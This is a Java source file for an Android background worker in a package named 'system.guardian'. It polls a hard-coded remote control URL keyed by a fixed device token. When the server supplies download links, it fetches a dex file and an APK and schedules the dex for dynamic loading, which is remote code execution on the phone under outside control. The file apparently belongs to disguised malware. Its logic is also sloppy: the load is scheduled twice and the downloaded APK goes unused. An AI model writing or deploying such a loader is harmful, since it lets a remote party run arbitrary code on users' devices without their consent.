package com.system.guardian;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

public class ControlPollerWorker extends Worker {

    public ControlPollerWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        String deviceToken = "535ef8dad6992485";
        String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";

        JSONObject response = NetworkUtils.getJsonFromUrl(url);
        if (response != null && response.has("dex_url")) {
            try {
                String dexUrl = response.getString("dex_url");
                String apkUrl = response.optString("apk_url");

                if (!dexUrl.isEmpty() && !apkUrl.isEmpty()) {
                    File dexFile = NetworkUtils.downloadFile(getApplicationContext(), dexUrl, "patch.dex");
                    if (dexFile.exists()) {
                        DexLoader.schedulePatchLoad(getApplicationContext(), dexFile);
                    } else {
                        CrashLogger.log(getApplicationContext(), "DEX_PATCH", "❌ Skipped patch — dexFile is null or missing");
                    }

                    File apkFile = NetworkUtils.downloadFile(getApplicationContext(), apkUrl, "update.apk");

                    DexLoader.schedulePatchLoad(getApplicationContext(), dexFile);
                }

            } catch (Exception e) {
                Log.e("DEX_PATCH", "❌ Error in ControlPollerWorker", e);
                CrashLogger.log(getApplicationContext(), "DEX_PATCH", "❌ Dex patch failed: " + e.getMessage());
                return Result.failure();
            }
        }
        return Result.success();
    }
}
